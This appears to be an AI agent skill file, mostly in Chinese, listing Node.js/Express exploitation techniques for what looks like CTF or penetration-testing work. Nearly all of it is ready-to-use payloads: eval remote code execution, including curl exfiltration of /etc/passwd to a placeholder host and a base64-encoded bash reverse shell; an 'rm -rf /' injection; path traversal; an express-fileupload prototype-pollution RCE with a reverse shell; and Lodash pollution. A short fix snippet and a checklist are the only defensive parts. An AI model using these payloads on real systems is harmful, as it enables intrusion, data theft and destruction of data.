---
name: nodejs-express
description: Use when encountering Node.js/Express安全漏洞 - eval RCE、路径穿越、express-fileupload、原型链污染
---

# Node.js/Express 安全漏洞

## Info

- **Domain**: web
- **Tags**: web, nodejs, express, rce

## 1. eval() 命令执行

```javascript
app.get('/eval', function(req, res) {
    res.send(eval(req.query.q));
});
```

### 利用
```javascript
// Windows
/eval?q=require('child_process').exec('calc');

// Linux 读取外传
/eval?q=require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://vps');

// 反弹 shell（base64 编码避免 + 被解析为空格）
/eval?q=require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash');
```

### 无 require 环境
```javascript
global.process.mainModule.constructor._load('child_process').exec('calc')
```

### new Function 注入
```javascript
const maliciousString = "require('child_process').execSync('rm -rf /')";
const maliciousFunc = new Function(maliciousString);
maliciousFunc();
```

## 2. Express 路径穿越

**影响版本**:
- Node.js 8.5.0 + Express 3.19.0-3.21.2
- Node.js 8.5.0 + Express 4.11.0-4.15.5

```
/static../../../etc/passwd
```

CVE-2017-14849

## 3. express-fileupload 代码注入 (CVE-2020-7699)

**条件**: `parseNested` 选项设置为 true，版本 < 1.1.9

### Payload
```
POST /upload
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="__proto__.outputFunctionName"

x;process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x
------
```

**通用 payload**:
```
x;process.mainModule.require('child_process').exec('bash -c "bash -i &> /dev/tcp/ip/port 0>&1"');x
```

## 4. Lodash 原型链污染

```javascript
// 通过 Function constructor 污染
payload: {"__proto__":{"sourceURL":"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"}}
```

利用链: `attempt()` → `Function()` → `sourceURL` 注入代码

## 5. Object.assign 原型链污染

```javascript
const attack = JSON.parse('{"__proto__":{"admin":true}}');
const config = {};
Object.assign(config, attack);
// 在某些环境下: Object.prototype.admin = true
```

**修复**:
```javascript
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    // ... merge logic
  }
}
```

## 6. Express 特性利用

### 查询参数解析特性
```
?a[b]=c     →  {a: {b: "c"}}
?a=1&a=2    →  {a: ["1", "2"]}
```
可绕过基于字符串匹配的过滤。

### parameterLimit
```
// 默认最大 1000 个参数
// 设置过高可能导致 DoS
```

## 7. 检测清单

- [ ] `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`
- [ ] `res.render(template, userControlled)`
- [ ] `express.static()` 路径穿越
- [ ] `express-fileupload` 版本 < 1.1.9
- [ ] Lodash `_.merge()` 原型链污染
- [ ] `Object.assign()` 不安全使用
- [ ] `__proto__` / `constructor.prototype` 未过滤
